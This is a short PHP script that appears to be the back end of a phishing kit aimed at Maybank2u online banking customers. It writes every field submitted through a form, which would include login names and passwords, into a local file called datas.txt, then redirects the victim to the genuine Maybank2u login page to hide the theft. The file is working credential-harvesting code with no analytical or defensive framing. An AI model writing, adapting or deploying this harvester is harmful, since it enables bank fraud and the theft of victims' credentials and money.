<?php
header('Location:https://www.maybank2u.com.my/mbb/m2u/common/M2ULogin.do?action=Login');
$handle = fopen("datas.txt", "a");
foreach ($_POST as $variable => $value) {
	# code...
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>